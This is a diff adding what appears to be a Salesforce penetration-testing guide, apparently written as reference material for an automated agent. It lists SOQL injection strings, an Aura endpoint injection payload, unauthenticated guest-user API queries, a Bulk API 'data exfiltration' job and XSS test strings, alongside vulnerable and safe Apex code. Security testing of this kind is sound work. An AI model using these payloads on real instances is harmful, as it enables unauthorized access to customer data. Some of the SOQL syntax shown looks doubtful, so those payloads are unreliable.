@@ -1,0 +1,194 @@
+<salesforce_security_guide>
+<title>SALESFORCE SECURITY TESTING</title>
+
+<critical>Salesforce security testing covers SOQL injection, Apex code vulnerabilities, sharing rule bypass, guest user exploitation, and API security. Critical for CRM systems containing customer, sales, and business data.</critical>
+
+<scope>
+- SOQL injection in queries
+- Apex code vulnerabilities
+- Sharing and visibility rules bypass
+- Guest user and Communities exploitation
+- API permission testing
+- Custom object exposure
+- Lightning component security
+- Experience Cloud (Communities) testing
+</scope>
+
+<methodology>
+1. Identify Salesforce instance and capabilities.
+2. Test for SOQL injection in search and query parameters.
+3. Analyze Apex code for vulnerabilities.
+4. Test sharing rules and access controls.
+5. Exploit guest user permissions in Communities.
+6. Test REST/SOAP API security.
+7. Review Lightning component security.
+</methodology>
+
+<soql_injection>
+{% raw %}
+# SOQL injection testing:
+
+# Basic injection:
+search?q=test' OR Name != null--
+
+# UNION not supported, use boolean blind:
+search?q=' OR (SELECT Id FROM Account WHERE Name='test')!=null--
+
+# Extract data via timing or errors:
+search?q=' AND LEN(Password__c)>5 --
+
+# Vulnerable Apex code:
+String query = 'SELECT Id FROM Account WHERE Name = \'' + userInput + '\'';
+List<Account> accounts = Database.query(query);
+
+# Safe (parameterized):
+List<Account> accounts = [SELECT Id FROM Account WHERE Name = :userInput];
+{% endraw %}
+</soql_injection>
+
+<apex_vulnerabilities>
+{% raw %}
+# Apex security testing:
+
+# Missing sharing enforcement:
+public class AccountController {
+  // Without sharing - ignores sharing rules
+  public List<Account> getAccounts() {
+    return [SELECT Id, Name FROM Account];
+  }
+}
+
+# Should use "with sharing":
+public with sharing class AccountController {
+  public List<Account> getAccounts() {
+    return [SELECT Id, Name FROM Account];
+  }
+}
+
+# CRUD/FLS bypass:
+# Missing field-level security checks
+Account acc = new Account(Name='Test');
+insert acc;  // May expose fields user shouldn't access
+
+# Safe approach:
+if (Schema.sObjectType.Account.isCreateable()) {
+  insert acc;
+}
+{% endraw %}
+</apex_vulnerabilities>
+
+<sharing_rules_bypass>
+{% raw %}
+# Sharing rules testing:
+
+# Organization-Wide Defaults (OWD):
+# Test if user can access records they shouldn't
+
+# Horizontal privilege escalation:
+GET /services/data/v52.0/sobjects/Account/001...  # Own account
+GET /services/data/v52.0/sobjects/Account/002...  # Other account
+
+# Vertical escalation:
+# Access admin-only objects via API
+
+# Guest user exploitation:
+# Communities allow unauthenticated access
+GET https://community.example.com/services/data/v52.0/query?q=SELECT+Id,Name+FROM+Account
+
+# Test object permissions:
+GET /services/data/v52.0/sobjects/Custom__c/describe
+{% endraw %}
+</sharing_rules_bypass>
+
+<api_testing>
+{% raw %}
+# REST API testing:
+GET /services/data/v52.0/query?q=SELECT+Id,Name,Email+FROM+Contact
+
+# SOAP API:
+POST /services/Soap/u/52.0
+<soapenv:Envelope>
+  <soapenv:Body>
+    <query><queryString>SELECT Id FROM Account</queryString></query>
+  </soapenv:Body>
+</soapenv:Envelope>
+
+# Bulk API (data exfiltration):
+POST /services/async/52.0/job
+<jobInfo><operation>query</operation></jobInfo>
+
+# Excessive permissions:
+# Check if API user has unnecessary object access
+{% endraw %}
+</api_testing>
+
+<lightning_component_security>
+{% raw %}
+# Lightning component testing:
+
+# Client-side exposure:
+# JavaScript controllers may expose sensitive logic
+# Check .js files in Lightning components
+
+# Aura endpoint:
+POST /aura?r=1&aura.ApexAction.execute=1
+{
+  "actions":[{
+    "descriptor":"serviceComponent://apex.ControllerName/ACTION$methodName",
+    "params":{"param1":"value' OR 1=1--"}
+  }]
+}
+
+# CSRF in Lightning:
+# Test if Lightning endpoints validate CSRF tokens
+
+# XSS in Lightning components:
+<aura:attribute name="message" type="String"/>
+<div>{!v.message}</div>
+# If not escaped, XSS possible
+{% endraw %}
+</lightning_component_security>
+
+<common_payloads>
+{% raw %}
+# SOQL injection:
+' OR Name != null--
+' AND (SELECT Id FROM Account)!=null--
+
+# Apex SOQL dynamic query:
+\' OR Name LIKE \'%
+
+# API unauthorized access:
+/services/data/v52.0/query?q=SELECT+Id+FROM+Custom__c
+/services/data/v52.0/sobjects/Account/001xxx
+
+# Guest user exploitation:
+# Access community endpoints without authentication
+GET /services/data/v52.0/query?q=SELECT+Id+FROM+Account
+
+# Lightning XSS:
+<script>alert(1)</script>
+{{7*7}}
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate SOQL injection in search or query.
+2. Show Apex code without sharing enforcement.
+3. Prove sharing rules bypass accessing unauthorized records.
+4. Document guest user exploitation in Communities.
+5. Show excessive API permissions allowing data access.
+6. Demonstrate Lightning component vulnerability.
+</validation>
+
+<impact>
+- Data exfiltration via SOQL injection
+- Unauthorized access bypassing sharing rules
+- Privilege escalation through Apex vulnerabilities
+- Mass data extraction via API abuse
+- Guest user exploitation exposing business data
+- XSS in Lightning components
+</impact>
+
+<remember>Salesforce security: SOQL injection (no UNION, use boolean blind), Apex "without sharing" bypasses rules, guest user in Communities often over-permissioned, API excessive permissions common, Lightning components need XSS prevention. Test sharing rules enforcement, check Apex code for security keywords (with/without sharing), enumerate accessible objects via API, test guest user access in Communities.</remember>
+</salesforce_security_guide>
